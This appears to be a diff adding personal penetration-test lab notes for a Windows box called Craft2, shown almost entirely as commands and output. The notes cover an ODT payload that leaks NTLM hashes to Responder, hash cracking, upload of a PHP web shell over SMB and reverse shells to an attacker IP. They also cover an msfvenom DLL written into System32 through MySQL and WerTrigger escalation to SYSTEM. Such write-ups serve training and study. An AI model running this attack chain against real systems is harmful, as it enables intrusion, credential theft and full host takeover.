@@ -1,0 +1,146 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.190.188 > Craft2.txt
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Craft
+135/tcp   open  msrpc         Microsoft Windows RPC
+445/tcp   open  microsoft-ds?
+49666/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-07-06T03:04:56
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+# Found upload file function in port80 website. Upload test file shows:
+File is not valid. Please submit ODT file
+
+$ python3 mmg-odt.py windows 192.168.45.165 80 
+[+] Payload: windows reverse shell
+[+] Creating malicious .odt file
+
+Done.
+
+You're resume was submitted, it will be reviewed shortly by our staff. We are also aware of macro phishing attempts made previously
+
+$ searchsploit odt -o
+LibreOffice/Open Office - '.odt' Information Disclosure | windows/local/44564.py
+
+this no working
+so try https://github.com/rmdavy/badodf/blob/master/badodt.py
+
+$ python3 badodt.py
+Please enter IP of listener: 192.168.45.165
+/home/alan/offseclabs/bad.odt successfully created
+
+$ sudo responder -I tun0 -wd
+#upload bad.odt
+
+[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:<hash>
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+winniethepooh    (thecybergeek)
+
+thecybergeek:winniethepooh
+
+$ nxc smb 192.168.190.188 -u thecybergeek -p winniethepooh
+SMB         192.168.190.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh
+
+$ smbclient //192.168.190.188/webapp -U thecybergeek
+# found can upload file in this folder
+
+smb: \> put shell.php
+putting file shell.php as \shell.php (2.0 kB/s) (average 58.4 kB/s)
+
+http://192.168.190.188/shell.php?cmd=whoami
+craft2\apache
+
+$ rlwrap nc -nlvp 443 
+listening on [any] 443 ...
+connect to [192.168.45.165] from (UNKNOWN) [192.168.190.188] 49806
+SOCKET: Shell has connected! PID: 5040
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs>whoami
+craft2\apache
+CVE-2020-1472 KB4601345 [Critical] Elevation of Privilege
+
+C:\xampp>sc qc MySQL
+SERVICE_NAME: MySQL
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\xampp\mysql\bin\mysqld.exe MySQL
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : MySQL
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+        
+Found MySQL Run by LocalSystem
+
+TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1796
+
+PS C:\xampp> cat passwords.txt
+1) MySQL (phpMyAdmin):
+
+   User: root
+   Password:
+   (means no password!)
+   
+set up ligolo-ng then:
+$ sudo ip route add 240.0.0.1/32 dev ligolo
+
+http://240.0.0.1/phpmyadmin
+
+# Follow https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/?source=post_page-----7527b7171183---------------------------------------#wertrigger
+
+WerTrigger
+
+    Exploit Privileged File Writes bugs with Windows Problem Reporting
+
+    Clone sailay1996/WerTrigger
+    Copy phoneinfo.dll to C:\Windows\System32\
+    Place Report.wer file and WerTrigger.exe in a same directory.
+    Then, run WerTrigger.exe.
+    Enjoy a shell as NT AUTHORITY\SYSTEM
+
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=135 -f dll -o phoneinfo.dll
+
+$ git clone https://github.com/sailay1996/WerTrigger.git
+
+# replace phoneinfo.dll in folder bin with my own msf dll
+
+select load_file('C:\\temp\\phoneinfo.dll') into dumpfile 'C:\\Windows\\system32\\phoneinfo.dll';
+select load_file('C:\\temp\\Report.wer') into dumpfile 'C:\\Windows\\system32\\Report.wer';
+select load_file('C:\\temp\\WerTrigger.exe') into dumpfile 'C:\\Windows\\system32\\WerTrigger.exe';
+
+C:\Windows\System32>.\WerTrigger.exe
+[+] Windows Error Reporting Trigger by @404death !
+[+] Trigger launched.
+[*] TCP connecting...
+[*] Waiting for the DLL to be loaded...
+[-] Unable to connect to server!
+[*] Retrying ...
+[-] Unable to connect to server!
+[*] Retrying ...
+[-] Unable to connect to server!
+[-] Exploit failed.
+
+$ rlwrap nc -nlvp 135
+listening on [any] 135 ...
+connect to [192.168.45.165] from (UNKNOWN) [192.168.190.188] 49730
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
